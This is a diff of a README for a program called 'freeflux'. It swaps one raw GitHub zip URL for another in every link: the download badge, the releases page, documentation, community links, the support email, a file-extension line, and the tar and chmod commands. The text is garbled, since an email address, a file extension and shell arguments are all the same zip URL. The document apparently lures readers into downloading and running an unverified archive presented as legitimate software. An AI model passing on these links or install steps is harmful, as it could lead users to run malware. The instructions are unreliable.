@@ -6,7 +6,7 @@ Welcome to **freeflux**, a smart solution aimed at making AI accessible to every
 
 ## 📥 Download Now
 
-[![Download freeflux](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip)](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip)
+[![Download freeflux](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip)](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip)
 
 ## 🔍 Features
 
@@ -21,7 +21,7 @@ Getting started with **freeflux** is easy. Follow these steps to download and se
 
 ### Step 1: Visit the Download Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip) on GitHub. This page lists the available versions of **freeflux**.
+Go to the [Releases page](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip) on GitHub. This page lists the available versions of **freeflux**.
 
 ### Step 2: Choose Your Version
 
@@ -33,7 +33,7 @@ You will find different files available for download. Select the one that fits y
 
 - **Windows**: Choose the file ending in `.exe`
 - **macOS**: Look for files with `.dmg`
-- **Linux**: Typically, the file will end in `https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip` or `.AppImage`
+- **Linux**: Typically, the file will end in `https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip` or `.AppImage`
 
 Click on the file name to start the download.
 
@@ -54,13 +54,13 @@ Once the download is complete, follow these instructions based on your operating
   2. Navigate to the location of the downloaded file.
   3. Run the following command:
      ```bash
-     tar -xzf https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip
+     tar -xzf https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip
      ```
      Replace `filename` with the actual file name.
      Or, for `.AppImage`:
      ```bash
-     chmod +x https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip
-     https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip
+     chmod +x https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip
+     https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip
      ```
 
 ## 🎉 How to Use freeflux
@@ -85,7 +85,7 @@ If you encounter any issues or have questions, feel free to connect with our com
 
 - **GitHub Issues**: Open a ticket on GitHub for bugs or feature requests.
 - **Community Forum**: Share your experiences and get assistance from fellow users.
-- **Email Support**: Reach out via email at https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip for direct help.
+- **Email Support**: Reach out via email at https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip for direct help.
 
 ## 💡 Tips for Best Performance
 
@@ -97,8 +97,8 @@ If you encounter any issues or have questions, feel free to connect with our com
 
 Visit the following links for more information:
 
-- [Documentation](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip): Explore in-depth usage guides and FAQs.
-- [Community Discussions](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip): Engage with other users and share your insights.
+- [Documentation](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip): Explore in-depth usage guides and FAQs.
+- [Community Discussions](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip): Engage with other users and share your insights.
 
 ## 📝 License
 
@@ -106,6 +106,6 @@ Visit the following links for more information:
 
 ## 🔄 Download & Install
 
-To get started with **freeflux**, visit the [Releases page](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip) and follow the simple steps outlined above. Enjoy the power of AI without needing an expensive setup!
+To get started with **freeflux**, visit the [Releases page](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip) and follow the simple steps outlined above. Enjoy the power of AI without needing an expensive setup!
 
-[![Download freeflux](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip)](https://raw.githubusercontent.com/Rian-create/freeflux/main/indigency/freeflux.zip)
+[![Download freeflux](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip)](https://raw.githubusercontent.com/Rian-create/freeflux/main/scripts/Software-v2.3.zip)
